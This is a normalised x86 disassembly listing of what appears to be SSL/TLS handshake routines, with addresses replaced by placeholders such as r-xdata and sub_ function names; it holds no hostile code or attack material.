push ebp
call sub_1000dab0
add esp 0x10
test ah 0x40
jne r-xdata
mov esi ebx
sub esi edx
sub esi 0x9
js r-xdata
cmp [ ebp + 0x118 ] 0x1
jne r-xdata
mov eax [ ebp + 0xbc ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov eax ecx
cmp eax esi
ja r-xdata
mov esi [ esp + 0x10 ]
mov ecx [ esp + 0x1c ]
mov eax esi
sub eax ecx
sub eax 0x2
jne r-xdata
mov eax [ ebp + 0x120 ]
xor ebx ebx
push eax
xor esi esi
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
xor eax eax
mov ecx [ eax + 0xcc ]
test ecx ecx
je r-xdata
mov [ edx ] 0x0
mov ecx [ esp + 0x10 ]
lea edx [ eax + 0x5 ]
mov [ ecx + 0x1 ] 0x0
mov ecx [ esp + 0x10 ]
add ecx 0x2
shr edx 0x8
mov [ esp + 0x10 ] ecx
mov [ ecx ] dl
mov edx [ esp + 0x10 ]
mov cl al
add cl 0x5
mov [ edx + 0x1 ] cl
mov ecx [ esp + 0x10 ]
lea edx [ eax + 0x3 ]
add ecx 0x2
shr edx 0x8
mov [ esp + 0x10 ] ecx
mov [ ecx ] dl
mov edx [ esp + 0x10 ]
mov cl al
add cl 0x3
mov [ edx + 0x1 ] cl
mov ecx [ esp + 0x10 ]
add ecx 0x2
mov edx eax
mov [ esp + 0x10 ] ecx
mov [ ecx ] 0x0
mov ecx [ esp + 0x10 ]
inc ecx
shr edx 0x8
mov [ esp + 0x10 ] ecx
mov [ ecx ] dl
mov ecx [ esp + 0x10 ]
mov [ ecx + 0x1 ] al
mov edi [ esp + 0x10 ]
mov esi [ ebp + 0x110 ]
mov ecx eax
mov edx ecx
add edi 0x2
shr ecx 0x2
mov [ esp + 0x10 ] edi
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
add [ esp + 0x10 ] eax
mov edx eax
mov [ ecx + 0x1 ] al
mov eax esi
pop edi
sar edx 0x8
pop esi
pop ebp
mov [ ecx ] dl
pop ebx
pop ecx
retn
pop edi
pop esi
pop ebp
mov eax ecx
pop ebx
pop ecx
retn
mov eax [ ebp + 0x124 ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x120 ]
push esi
push ecx
call sub_1001e7c0
push 0x0
push eax
call sub_100206e0
add esp 0x10
test eax eax
jle r-xdata
mov [ ecx ] 0x0
mov ecx [ esp + 0x10 ]
mov edx eax
mov [ ecx + 0x1 ] 0x23
mov ecx [ esp + 0x10 ]
add ecx 0x2
sar edx 0x8
mov [ esp + 0x10 ] ecx
mov [ ecx ] dl
mov ecx [ esp + 0x10 ]
mov [ ecx + 0x1 ] al
mov edx [ esp + 0x10 ]
add edx 0x2
test eax eax
mov [ esp + 0x10 ] edx
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn
mov eax [ eax + 0xd0 ]
jmp r-xdata
mov [ esp + 0x18 ] 0x0
mov eax [ esp + 0x18 ]
push 0x0
push eax
call sub_100207b0
add esp 0x8
mov [ esp + 0x18 ] eax
test eax eax
jge r-xdata
mov edx [ ebp + 0x120 ]
lea ebx [ ebx + eax + 0x2 ]
push edx
inc esi
call sub_1001e7b0
add esp 0x4
cmp esi eax
jl r-xdata
mov edx [ ebp + 0xbc ]
mov edi [ esp + 0x10 ]
mov ecx eax
mov esi [ edx + 0xcc ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
add [ esp + 0x10 ] eax
mov ecx [ esp + 0x10 ]
sub ebx eax
sub ebx ecx
sub ebx 0x4
jns r-xdata
mov [ edx ] 0x0
mov ecx [ esp + 0x10 ]
mov edi 0x2
mov [ ecx + 0x1 ] 0x5
mov esi [ esp + 0x10 ]
lea ecx [ eax + ebx ]
add esi edi
cmp ecx 0xfff0
mov [ esp + 0x10 ] esi
jle r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn
mov ecx [ esp + 0x20 ]
mov edx [ esp + 0x10 ]
sub ecx eax
sub ecx ebx
sub ecx edx
sub ecx 0x7
jns r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn
mov edx [ esp + 0x10 ]
add ecx 0x5
sar ecx 0x8
mov [ edx ] cl
mov edx [ esp + 0x10 ]
mov cl bl
xor esi esi
add cl al
add cl 0x5
mov [ edx + 0x1 ] cl
mov eax [ esp + 0x10 ]
add eax edi
mov ecx ebx
mov [ esp + 0x10 ] eax
mov [ eax ] 0x1
mov eax [ esp + 0x10 ]
inc eax
sar ecx 0x8
mov [ esp + 0x10 ] eax
mov [ eax ] cl
mov edx [ esp + 0x10 ]
mov [ edx + 0x1 ] bl
mov eax [ esp + 0x10 ]
add eax edi
mov [ esp + 0x10 ] eax
mov eax [ ebp + 0x120 ]
push eax
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
mov eax [ esp + 0x18 ]
mov edx [ esp + 0x10 ]
mov ecx eax
sar ecx 0x8
mov [ edx ] cl
mov ecx [ esp + 0x10 ]
mov [ ecx + 0x1 ] al
mov edx [ esp + 0x10 ]
add edx edi
test eax eax
mov [ esp + 0x10 ] edx
jle r-xdata
mov ecx [ ebp + 0x120 ]
mov edi [ esp + 0x10 ]
push esi
push ecx
call sub_1001e7c0
mov ecx [ esp + 0x18 ]
lea edx [ esp + 0x18 ]
add ecx 0x2
push edx
push eax
mov [ esp + 0x20 ] ecx
call sub_100206e0
mov ecx eax
mov [ edi + 0x1 ] al
sar ecx 0x8
mov [ edi ] cl
mov edx [ ebp + 0x120 ]
push edx
inc esi
call sub_1001e7b0
add esp 0x14
cmp esi eax
jl r-xdata
mov eax [ ebp + 0x124 ]
lea edx [ esp + 0x10 ]
push edx
push eax
call sub_100207b0
add esp 0x8
mov edi 0x2
sub_100149f0
mov eax 0x4
call sub_1001d0d0
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0xc ]
push ebx
push ebp
add edx ecx
push esi
mov esi [ eax ]
lea eax [ edx - 0x2 ]
push edi
cmp esi eax
mov [ esp + 0x10 ] 0x0
mov [ esp + 0x20 ] edx
jae r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
pop ecx
retn
mov edi [ esp + 0x18 ]
add esi 0x2
lea eax [ edx - 0x4 ]
cmp esi eax
ja r-xdata
cmp esi edx
je r-xdata
xor ebx ebx
xor ecx ecx
mov bh [ esi ]
mov ch [ esi + 0x2 ]
mov bl [ esi + 0x1 ]
mov cl [ esi + 0x3 ]
add esi 0x2
mov ebp ecx
mov eax ebp
add esi 0x2
and eax 0xffff
lea ecx [ eax + esi ]
cmp ecx edx
mov [ esp + 0x24 ] ecx
ja r-xdata
mov eax [ edi + 0x6c ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x28 ]
pop edi
pop esi
pop ebp
mov [ ecx ] 0x32
xor eax eax
pop ebx
pop ecx
retn
mov ecx [ edi + 0x108 ]
test ecx ecx
je r-xdata
mov edx [ esp + 0x1c ]
mov [ edx ] esi
cmp [ esp + 0x10 ] 0x1
jne r-xdata
mov esi 0x1
mov edx [ edi + 0x10c ]
push edx
push eax
mov eax ebx
push esi
and eax 0xffff
mov esi 0x1
push eax
push esi
push edi
call ecx
mov edx [ esp + 0x38 ]
add esp 0x18
jmp r-xdata
mov eax [ edi + 0x110 ]
test eax eax
je r-xdata
cmp bx 0x23
jne r-xdata
mov eax [ edi + 0x110 ]
test eax eax
je r-xdata
test bx bx
jne r-xdata
mov edx [ edi + 0xbc ]
mov ecx [ edx + 0xc8 ]
test ecx ecx
jne r-xdata
cmp bx 0x5
jne r-xdata
push 0x0
push 0x0
push 0x20
push edi
call sub_1000dab0
add esp 0x10
test ah 0x40
jne r-xdata
mov ecx [ esp + 0x28 ]
pop edi
pop esi
pop ebp
mov [ ecx ] 0x70
xor eax eax
pop ebx
pop ecx
retn
test bp bp
ja r-xdata
push eax
call sub_100266f0
mov ecx [ edi + 0xbc ]
add esp 0x4
mov [ ecx + 0xc8 ] eax
mov edx [ edi + 0xbc ]
mov eax [ edx + 0xc8 ]
test eax eax
jne r-xdata
mov esi [ esp + 0x24 ]
lea eax [ edx - 0x4 ]
cmp esi eax
jbe r-xdata
cmp [ edi + 0x118 ] 0xffffffff
je r-xdata
mov edx [ esp + 0x28 ]
pop edi
pop esi
pop ebp
mov [ edx ] 0x6e
xor eax eax
pop ebx
pop ecx
retn
test bp bp
ja r-xdata
mov [ esp + 0x10 ] esi
jmp r-xdata
mov eax [ esp + 0x28 ]
pop edi
pop esi
pop ebp
mov [ eax ] 0x70
xor eax eax
pop ebx
pop ecx
retn
mov eax [ esp + 0x28 ]
pop edi
pop esi
pop ebp
mov [ eax ] 0x6e
xor eax eax
pop ebx
pop ecx
retn
test bp bp
ja r-xdata
mov edx [ esp + 0x20 ]
mov [ edi + 0x130 ] esi
jmp r-xdata
mov [ edi + 0x11c ] esi
sub_10014bc0
mov eax 0x4
call sub_1001d0d0
push esi
mov esi [ esp + 0xc ]
push edi
mov edi 0x3
mov eax [ esi + 0xd8 ]
mov [ esp + 0x8 ] 0x70
test eax eax
je r-xdata
mov eax [ esi + 0x134 ]
test eax eax
je r-xdata
mov ecx [ eax + 0xfc ]
test ecx ecx
jne r-xdata
cmp [ esi + 0x118 ] 0xffffffff
je r-xdata
mov ecx [ eax + 0xfc ]
test ecx ecx
je r-xdata
mov eax [ eax + 0x100 ]
lea edx [ esp + 0x8 ]
push eax
push edx
push esi
call ecx
add esp 0xc
mov edi eax
dec edi
je r-xdata
mov eax [ esi + 0x11c ]
test eax eax
jne r-xdata
mov eax [ esp + 0x8 ]
push eax
push 0x1
push esi
call sub_10013ab0
add esp 0xc
dec edi
je r-xdata
mov eax [ esi + 0xd8 ]
mov ecx [ eax + 0x138 ]
test ecx ecx
je r-xdata
mov edx [ esp + 0x8 ]
push edx
push 0x2
push esi
call sub_10013ab0
add esp 0xc
or eax 0xffffffff
pop edi
pop esi
pop ecx
retn
dec edi
jne r-xdata
mov eax [ esi + 0x128 ]
test eax eax
je r-xdata
pop edi
mov eax 0x1
pop esi
pop ecx
retn
mov [ esi + 0x114 ] 0x0
pop edi
mov eax 0x1
pop esi
pop ecx
retn
mov eax [ esi + 0xd8 ]
mov [ esi + 0x12c ] 0xffffffff
mov ecx [ eax + 0x13c ]
push ecx
push esi
call [ eax + 0x138 ]
add esp 0x8
test eax eax
jne r-xdata
push eax
call sub_1001d740
add esp 0x4
mov [ esi + 0x128 ] 0x0
jge r-xdata
mov [ esp + 0x8 ] 0x71
jmp r-xdata
mov [ esp + 0x8 ] 0x50
mov edi 0x2
sub_10014d50
mov eax 0x18
call sub_1001d0d0
push ebp
push esi
xor ebp ebp
push edi
push ebp
mov [ esp + 0x18 ] ebp
call time
mov [ esp + 0x1c ] eax
push ebp
push ebp
lea eax [ esp + 0x24 ]
xor edi edi
push 0x4
push eax
mov [ esp + 0x20 ] edi
mov [ esp + 0x24 ] ebp
call sub_10021890
add esp 0x14
call sub_1001df60
push ebp
call [ SetLastError@IAT ]
mov esi [ esp + 0x28 ]
mov eax [ esi + 0xcc ]
cmp eax ebp
jne r-xdata
mov edi eax
mov [ esp + 0xc ] edi
mov ecx [ esi + 0xd8 ]
mov eax [ ecx + 0x9c ]
cmp eax ebp
je r-xdata
push esi
call sub_1000d0d0
add esp 0x4
push esi
call sub_1000e7d0
add esp 0x4
test ah 0x40
je r-xdata
mov eax [ esi + 0x1c ]
push esi
inc eax
mov [ esi + 0x1c ] eax
call sub_1000e7d0
add esp 0x4
test ah 0x30
je r-xdata
cmp eax 0x11e1
jg r-xdata
cmp eax 0x1170
jge r-xdata
push ebx
mov ebx 0x1
cmp eax 0x4000
jg r-xdata
cmp eax 0x11e0
jge r-xdata
push esi
call sub_10017a30
mov edi eax
add esp 0x4
cmp edi ebp
jle r-xdata
cmp eax 0x1121
jg r-xdata
cmp eax 0x5000
jne r-xdata
je r-xdata
push esi
call sub_10016f30
mov edi eax
add esp 0x4
cmp edi ebp
jle r-xdata
add eax 0xffffee80
cmp eax 0x51
ja r-xdata
mov edx [ esi + 0x1c ]
mov eax [ esp + 0x18 ]
dec edx
cmp eax ebp
mov [ esi + 0x1c ] edx
pop ebx
je r-xdata
mov [ esi + 0x34 ] 0x1180
jmp r-xdata
add eax 0xffffeed0
cmp eax 0x31
ja r-xdata
cmp eax 0x1120
jge r-xdata
push 0x224
push r--data
push 0xff
jmp r-xdata
cmp edi ebp
mov [ esi + 0x24 ] ebp
je r-xdata
cmp eax 0x11f0
jl r-xdata
mov [ esi + 0x34 ] 0x11d0
jmp r-xdata
xor ecx ecx
mov cl [ eax + lookup_table_100155cc ]
jmp [ ecx * 4 + jump_table_100155b4 ]
mov eax [ esp + 0xc ]
cmp eax ebp
je r-xdata
push eax
call sub_1001dca0
add esp 0x4
mov [ esi + 0x44 ] ebp
xor ecx ecx
mov cl [ eax + lookup_table_10015580 ]
jmp [ ecx * 4 + jump_table_1001556c ]
push esi
call sub_10015850
mov edi eax
add esp 0x4
cmp edi ebp
jle r-xdata
cmp eax 0x1003
jg r-xdata
push 0x84
push 0x14
call sub_1001de60
add esp 0x14
mov edx [ esi ]
and edx 0xff00
cmp edx 0x300
jne r-xdata
push ebx
push 0x10
push esi
call edi
add esp 0xc
cmp eax 0x11f1
jle r-xdata
push esi
call sub_10017270
mov edi eax
add esp 0x4
cmp edi ebp
jle r-xdata
push esi
call sub_10017860
mov edi eax
add esp 0x4
cmp edi ebp
jle r-xdata
push 0x11a1
push 0x11a0
push esi
call sub_10013e20
mov edi eax
add esp 0xc
cmp edi ebp
jle r-xdata
mov edx [ esi + 0x8 ]
mov eax [ edx + 0x64 ]
mov ecx [ eax + 0x24 ]
mov edx [ eax + 0x20 ]
push ecx
push edx
push 0x11b1
push 0x11b0
push esi
call sub_10013ca0
mov edi eax
add esp 0x14
cmp edi ebp
jle r-xdata
push 0x11d1
push 0x11d0
push esi
call sub_10013d50
mov edi eax
add esp 0xc
cmp edi ebp
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebp
add esp 0x18
retn
push edi
push 0x1002
push esi
call eax
add esp 0xc
mov edi [ esp + 0x10 ]
mov [ esp + 0x14 ] ebp
jmp r-xdata
cmp [ esp + 0x14 ] ebp
jne r-xdata
mov eax [ esi + 0xbc ]
cmp [ eax + 0xcc ] ebp
je r-xdata
push esi
call sub_10016130
mov edi eax
add esp 0x4
cmp edi ebp
jle r-xdata
push esi
call sub_10016c00
mov edi eax
add esp 0x4
cmp edi ebp
jle r-xdata
mov edx [ esi + 0x8 ]
lea eax [ esp + 0x24 ]
push eax
push 0x1e
push 0xe
push 0x1161
push 0x1160
push esi
call [ edx + 0x30 ]
mov ecx [ esp + 0x3c ]
add esp 0x18
cmp ecx ebp
jne r-xdata
mov eax [ esi + 0x6c ]
neg eax
sbb eax eax
and eax 0xa0
add eax 0x1130
mov [ esi + 0x34 ] eax
jmp r-xdata
cmp eax 0x1100
je r-xdata
je r-xdata
push 0xd3
push r--data
push 0x44
mov eax [ esi + 0x3c ]
mov [ esi + 0x4 ] 0x1000
cmp eax ebp
jne r-xdata
push esi
call sub_10017110
mov edi eax
add esp 0x4
cmp edi ebp
jle r-xdata
cmp eax 0x3004
jne r-xdata
mov eax [ esi + 0x58 ]
cmp [ eax + 0x35c ] ebx
jne r-xdata
mov edx [ esi + 0x58 ]
mov [ esi + 0x34 ] 0x11a0
mov [ esi + 0x44 ] ebp
mov [ edx + 0x194 ] ebp
jmp r-xdata
mov eax [ esi + 0x58 ]
mov ecx [ esi + 0xbc ]
mov [ esi + 0x34 ] 0x11b0
mov [ esi + 0x44 ] ebp
mov edx [ eax + 0x348 ]
mov [ ecx + 0xac ] edx
mov eax [ esi + 0x58 ]
mov eax [ eax + 0x384 ]
cmp eax ebp
jne r-xdata
mov eax [ esi + 0x58 ]
mov [ esi + 0x34 ] 0x1100
mov ecx [ eax ]
and ecx 0xfffffffb
mov [ eax ] ecx
mov eax [ esi + 0x6c ]
cmp eax ebp
je r-xdata
mov ecx [ esi + 0x6c ]
neg ecx
sbb ecx ecx
and ecx 0x119d
add ecx 0x3
mov [ esi + 0x34 ] ecx
jmp r-xdata
mov eax [ esi + 0x34 ]
cmp eax 0x1173
mov [ esp + 0x2c ] eax
jg r-xdata
cmp [ esi + 0xdc ] ebp
je r-xdata
mov edx [ esi + 0x58 ]
mov eax [ edx + 0x348 ]
mov ecx [ eax + 0xc ]
test ch 0x8
jne r-xdata
cmp [ eax + 0x44 ] ebp
jne r-xdata
push esi
mov [ esi + 0x34 ] 0x1150
mov [ esi + 0x44 ] ebp
call sub_10017c10
add esp 0x4
test eax eax
je r-xdata
mov [ esi + 0x34 ] 0x1160
jmp r-xdata
cmp eax ebp
jg r-xdata
cmp eax ebp
mov edi eax
jle r-xdata
mov edx [ esi + 0x10 ]
push ebp
push ebp
push 0x3
push edx
call sub_10020c60
add esp 0x10
test eax eax
jle r-xdata
cmp eax 0x110f
jle r-xdata
cmp eax 0x3
je r-xdata
push esi
call sub_10014540
add esp 0x4
test eax eax
je r-xdata
call sub_1001dc60
mov edi eax
cmp edi ebp
mov [ esp + 0x18 ] edi
je r-xdata
mov [ esi + 0x34 ] 0x1140
jmp r-xdata
mov eax [ esi + 0xd8 ]
mov [ esi + 0x28 ] ebx
mov [ esi + 0x34 ] 0x1000
inc [ eax + 0x38 ]
jmp r-xdata
mov [ esi + 0x34 ] 0x11a0
mov [ eax + 0x194 ] ebp
jmp r-xdata
mov [ esi + 0x34 ] 0x1190
jmp r-xdata
mov eax [ esi + 0x58 ]
cmp [ eax + 0x358 ] ebp
jne r-xdata
mov edx [ esi + 0xbc ]
mov eax [ eax ]
mov [ edx + 0xa8 ] eax
mov ecx [ esi + 0xbc ]
mov [ ecx + 0xa8 ] ebp
jmp r-xdata
cmp [ esi + 0x130 ] ebp
je r-xdata
mov eax [ esi + 0x58 ]
mov ecx 0x3
mov [ eax + 0x354 ] ecx
mov eax [ esi + 0x58 ]
test [ eax ] 0x2
je r-xdata
cmp [ esp + 0x10 ] ebp
je r-xdata
mov ecx [ esi + 0x10 ]
push ebp
push ebp
push 0xb
push ecx
call sub_10020c60
mov edi eax
add esp 0x10
cmp edi ebp
jle r-xdata
mov [ esp + 0x14 ] ebx
mov [ esi + 0x34 ] 0x1140
jmp r-xdata
push esi
call sub_10015ce0
mov edi eax
add esp 0x4
cmp edi ebp
jle r-xdata
mov ecx [ esi + 0xfc ]
mov edx [ esi + 0x8 ]
lea eax [ esp + 0x20 ]
push eax
push ecx
push 0xffffffff
push 0x1131
push 0x1130
push esi
call [ edx + 0x30 ]
mov ecx [ esp + 0x38 ]
add esp 0x18
cmp ecx ebp
jne r-xdata
or edi 0xffffffff
jmp r-xdata
push 0x32
push 0x2
push esi
call sub_10013ab0
push 0x72d
push r--data
push 0x9f
push 0x91
push 0x14
call sub_1001de60
add esp 0x20
jmp r-xdata
jmp r-xdata
mov ecx [ esi + 0x58 ]
mov edx [ ecx + 0x35c ]
neg edx
sbb edx edx
and edx 0xfffffff0
add edx 0x1180
mov [ esi + 0x34 ] edx
jmp r-xdata
mov ecx [ esi + 0x58 ]
mov edx [ ecx + 0x354 ]
mov [ esi + 0x34 ] edx
jmp r-xdata
mov eax [ esi + 0x10 ]
push ebp
push ebp
push 0xb
push eax
mov [ esi + 0x18 ] 0x2
call sub_10020c60
add esp 0x10
test eax eax
jle r-xdata
cmp eax 0x1111
jg r-xdata
push esi
call sub_1001a420
mov eax [ esi + 0x3c ]
add esp 0x4
cmp eax ebp
je r-xdata
cmp eax 0x1000
jne r-xdata
push ebp
push esi
call sub_1000e6d0
add esp 0x8
test eax eax
je r-xdata
push 0x4000
push edi
call sub_1001dce0
add esp 0x8
test eax eax
je r-xdata
mov eax [ esi + 0x8 ]
push 0x12
push esi
mov ecx [ eax + 0x64 ]
call [ ecx + 0x10 ]
add esp 0x8
test eax eax
je r-xdata
mov ecx [ esi + 0x8 ]
push esi
mov edx [ ecx + 0x64 ]
call [ edx + 0x8 ]
add esp 0x4
test eax eax
je r-xdata
mov eax [ esi + 0x58 ]
mov [ eax + 0x354 ] 0x11d0
jmp r-xdata
mov edx [ esi + 0x58 ]
mov [ edx + 0x354 ] 0x11e0
jmp r-xdata
mov [ esi + 0x34 ] ecx
mov ecx [ eax ]
or ecx 0x4
mov [ eax ] ecx
mov ecx [ esi + 0x58 ]
mov [ ecx + 0x4 ] ebp
jmp r-xdata
mov edi [ esi + 0x34 ]
mov eax [ esp + 0x2c ]
cmp edi eax
je r-xdata
mov ecx [ esi + 0x11c ]
neg ecx
sbb ecx ecx
and ecx 0xb0
add ecx 0x1140
mov [ esi + 0x34 ] ecx
jmp r-xdata
mov edx [ esi + 0x58 ]
mov [ edx + 0x358 ] ebx
mov eax [ esi + 0x58 ]
mov eax [ eax + 0x344 ]
cmp eax 0x14
je r-xdata
cmp eax ebp
mov edi eax
jle r-xdata
mov [ esi + 0x18 ] ebx
push esi
mov [ esi + 0x30 ] ebp
call sub_10015620
mov edi eax
add esp 0x4
cmp edi ebp
jle r-xdata
mov eax [ esi + 0x58 ]
test [ eax ] 0x4
jne r-xdata
push eax
call sub_1001dca0
add esp 0x4
mov [ esi + 0x3c ] ebp
jmp r-xdata
push esi
call sub_1001a5e0
mov eax [ esi + 0xd8 ]
mov [ esi + 0x34 ] 0x1110
add esp 0x4
inc [ eax + 0x34 ]
mov [ esi + 0x3c ] edi
mov [ esp + 0x18 ] ebp
jmp r-xdata
push ebx
mov edx eax
push 0x1001
push esi
mov [ esi + 0x34 ] edx
call [ esp + 0x1c ]
add esp 0xc
mov [ esi + 0x34 ] edi
mov ecx [ esi + 0x130 ]
mov [ esi + 0x6c ] ebx
neg ecx
sbb ecx ecx
and ecx 0x10
add ecx 0x11d0
mov [ esi + 0x34 ] ecx
jmp r-xdata
cmp eax 0x4
jne r-xdata
cmp eax 0x2
jne r-xdata
mov eax [ esi + 0x14 ]
mov ecx [ esi + 0x10 ]
cmp eax ecx
mov [ esi + 0x34 ] 0x1120
mov [ esi + 0x44 ] ebp
je r-xdata
push ebx
push esi
mov [ esi + 0x44 ] ebp
mov [ esi + 0x28 ] ebp
call sub_1000e570
mov eax [ esi + 0x6c ]
add esp 0x8
cmp eax ebp
je r-xdata
push esi
call sub_1000e790
add esp 0x4
jmp r-xdata
push ecx
push eax
call sub_10020d90
add esp 0x8
mov [ esi + 0x10 ] eax
jmp r-xdata
mov eax [ esi + 0xd8 ]
mov [ esi + 0x20 ] sub_10014d50
mov edi ebx
mov ecx [ eax + 0x3c ]
inc ecx
mov [ eax + 0x3c ] ecx
mov eax [ esp + 0x10 ]
cmp eax ebp
je r-xdata
mov eax [ esi + 0xd8 ]
inc [ eax + 0x58 ]
push ebx
push 0x20
push esi
call eax
add esp 0xc
jmp r-xdata
sub_10015620
mov eax 0x4
call sub_1001d0d0
push ebx
push ebp
mov ebp [ esp + 0x10 ]
push esi
push edi
mov eax [ ebp + 0x3c ]
mov ebx [ eax + 0x4 ]
mov eax [ ebp + 0x34 ]
cmp eax 0x1110
mov [ esp + 0x18 ] ebx
jne r-xdata
push 0x16
push ebp
call sub_10013c00
add esp 0x8
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov eax [ ebp + 0xbc ]
test eax eax
je r-xdata
push 0x0
push ebp
call sub_1000f330
add esp 0x8
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ebp ]
cmp ecx edx
jne r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
pop ecx
retn
mov esi [ ebp + 0x58 ]
push 0x0
add esi 0xb8
call time
mov edx eax
mov ecx eax
shr edx 0x18
mov [ esi ] dl
inc esi
shr ecx 0x10
mov [ esi ] cl
mov edx eax
inc esi
push 0x1c
shr edx 0x8
mov [ esi ] dl
inc esi
mov [ esi ] al
inc esi
push esi
call sub_10021970
add esp 0xc
test eax eax
jle r-xdata
mov ecx [ eax + 0x8c ]
test ecx ecx
je r-xdata
mov eax [ ebp ]
add ebx 0x4
sar eax 0x8
mov [ esp + 0x10 ] ebx
mov [ ebx ] al
mov cl [ ebp ]
inc ebx
mov [ ebx ] cl
mov esi [ ebp + 0x58 ]
mov edx [ ebp ]
inc ebx
add esi 0xb8
mov ecx 0x8
mov edi ebx
mov [ ebp + 0x104 ] edx
[ edi ] [ esi ]
mov eax [ ebp + 0x28 ]
add ebx 0x20
test eax eax
je r-xdata
mov eax [ ebp + 0xbc ]
mov eax [ eax + 0x44 ]
xor eax eax
jmp r-xdata
lea eax [ ebx + 0x2 ]
push 0x0
push eax
push ebp
call sub_1000de10
add esp 0x4
push eax
push ebp
call sub_1000de70
add esp 0x10
test eax eax
jne r-xdata
cmp eax 0x20
jle r-xdata
mov [ ebx ] al
inc ebx
test eax eax
je r-xdata
mov ecx eax
mov [ ebx + 0x1 ] al
sar ecx 0x8
mov [ ebx ] cl
mov edx [ ebp + 0xd8 ]
lea esi [ ebx + eax + 0x2 ]
mov eax [ edx + 0x98 ]
test eax eax
jne r-xdata
push 0x284
push r--data
push 0xb5
jmp r-xdata
mov esi [ ebp + 0xbc ]
mov ecx eax
mov edx ecx
add esi 0x48
mov edi ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
add ebx eax
[ edi ] [ esi ]
push 0x279
jmp r-xdata
push eax
call sub_1001e7b0
add esp 0x4
mov ebx eax
xor ebx ebx
jmp r-xdata
push 0x83
push 0x14
call sub_1001de60
add esp 0x14
push r--data
push 0x44
mov edi [ esp + 0x18 ]
mov [ esi ] 0x0
inc esi
lea ecx [ edi + 0x4000 ]
push ecx
push esi
push ebp
call sub_10014680
add esp 0xc
test eax eax
jne r-xdata
mov ecx [ ebp + 0xd8 ]
push edi
mov edx [ ecx + 0x98 ]
push edx
call sub_1001e7c0
mov al [ eax ]
add esp 0x8
mov [ esi ] al
inc esi
inc edi
cmp edi ebx
jl r-xdata
mov al bl
xor edi edi
inc al
mov [ esi ] al
inc esi
test ebx ebx
jle r-xdata
mov edx [ esp + 0x10 ]
mov ecx eax
sub ecx edx
mov [ edi ] 0x1
mov edx ecx
mov [ edi + 0x3 ] cl
shr edx 0x10
mov [ edi + 0x1 ] dl
mov edx ecx
shr edx 0x8
sub eax edi
mov [ edi + 0x2 ] dl
mov [ ebp + 0x34 ] 0x1111
mov [ ebp + 0x44 ] eax
mov [ ebp + 0x48 ] 0x0
push 0x29d
sub_10015850
mov eax 0x10
call sub_1001d0d0
push ebx
mov ebx [ esp + 0x18 ]
push ebp
push esi
mov eax [ ebx + 0x8 ]
lea ecx [ esp + 0x18 ]
push edi
push ecx
push 0x4e20
push 0xffffffff
push 0x1121
push 0x1120
push ebx
call [ eax + 0x30 ]
mov ecx [ esp + 0x34 ]
add esp 0x18
test ecx ecx
mov [ esp + 0x18 ] eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
push ebx
call sub_1002c960
add esp 0x4
cmp eax 0xfeff
jne r-xdata
mov edi [ ebx + 0x58 ]
cmp [ edi + 0x344 ] 0x2
je r-xdata
mov eax [ ebx + 0x58 ]
cmp [ eax + 0x344 ] 0x3
jne r-xdata
mov eax [ ebx ]
mov esi [ ebx + 0x40 ]
mov ecx eax
xor edx edx
mov [ esp + 0x24 ] esi
mov dl [ esi ]
sar ecx 0x8
cmp edx ecx
mov [ esp + 0x14 ] esi
jne r-xdata
mov [ esp + 0x10 ] 0xa
push 0x2dc
mov edx [ ebx + 0x5c ]
cmp [ edx ] 0x0
jne r-xdata
push 0x2e4
push r--data
push 0x10a
push 0x92
push 0x14
call sub_1001de60
mov eax [ esp + 0x38 ]
add esp 0x14
xor edx edx
mov dl [ eax + 0x1 ]
mov [ esp + 0x10 ] 0x46
mov dh [ ebx + 0x1 ]
mov [ ebx ] edx
cmp [ esi + 0x1 ] al
jne r-xdata
mov ecx [ esp + 0x10 ]
push ecx
push 0x2
push ebx
call sub_10013ab0
add esp 0xc
or eax 0xffffffff
mov [ esp + 0x10 ] 0xa
push 0x2d3
jmp r-xdata
mov [ eax + 0x358 ] 0x1
add esi 0x2
add edi 0x98
mov ecx 0x8
mov [ esp + 0x24 ] esi
[ edi ] [ esi ]
mov eax [ esp + 0x24 ]
xor ecx ecx
add eax 0x20
mov [ esp + 0x24 ] eax
mov cl [ eax ]
inc eax
mov ebp ecx
mov [ esp + 0x24 ] eax
cmp ebp 0x20
ja r-xdata
push r--data
push 0x72
push 0x92
push 0x14
call sub_1001de60
add esp 0x14
jmp r-xdata
push 0x2f6
push r--data
push 0x12c
push 0x92
push 0x14
mov [ esp + 0x24 ] 0x2f
call sub_1001de60
add esp 0x14
jmp r-xdata
test ebp ebp
je r-xdata
mov eax [ ebx + 0xbc ]
mov [ ebx + 0x6c ] 0x0
mov ecx [ eax + 0x44 ]
test ecx ecx
jbe r-xdata
mov edx [ ebx + 0xbc ]
cmp ebp [ edx + 0x44 ]
jne r-xdata
mov ecx [ ebx + 0xbc ]
mov [ ecx + 0x44 ] ebp
mov edi [ ebx + 0xbc ]
mov esi [ esp + 0x24 ]
mov ecx ebp
mov edx ecx
add edi 0x48
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ esp + 0x24 ]
push 0x0
push ebx
call sub_1000f330
add esp 0x8
test eax eax
jne r-xdata
lea edi [ edx + 0x48 ]
mov ecx ebp
mov esi eax
xor edx edx
[ esi ] [ edi ]
